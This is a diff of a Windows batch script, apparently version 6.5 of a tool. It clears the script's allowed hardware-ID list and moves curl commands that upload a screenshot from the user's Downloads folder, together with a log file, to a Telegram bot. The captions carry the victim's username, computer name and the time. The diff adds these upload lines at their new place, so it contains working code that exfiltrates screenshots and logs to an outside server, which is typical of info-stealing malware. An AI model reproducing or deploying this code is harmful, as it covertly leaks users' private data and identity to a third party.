@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=6.4"
+set "BATCHVERSION=6.5"
 
 
 
@@ -50,7 +50,7 @@ exit
 
 
 :: Define allowed HWIDs here
-set "VALID_HWIDS=FC7A415E-7DAA-924A-97B8-0922D4BD74B3"
+set "VALID_HWIDS="
 
 
 
@@ -1563,12 +1563,6 @@ set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 :: URL encode the caption
 set "ENCODED_CAPTION=%CAPTION: =%%2%"
 
-:: Send the photo with caption using curl
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
-     -F "chat_id=%CHAT_ID%" ^
-     -F "caption=%ENCODED_CAPTION%" ^
-     -F "photo=@%PHOTO_PATH%"
-
 
 
 :: Send the file (as a document)
@@ -1576,6 +1570,18 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
      -F "chat_id=%CHAT_ID%" ^
      -F "caption=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)" ^
      -F "document=@%LOGFILE1%"
+
+
+
+
+
+:: Send the photo with caption using curl
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
+     -F "chat_id=%CHAT_ID%" ^
+     -F "caption=%ENCODED_CAPTION%" ^
+     -F "photo=@%PHOTO_PATH%"
+
+
 
 
 
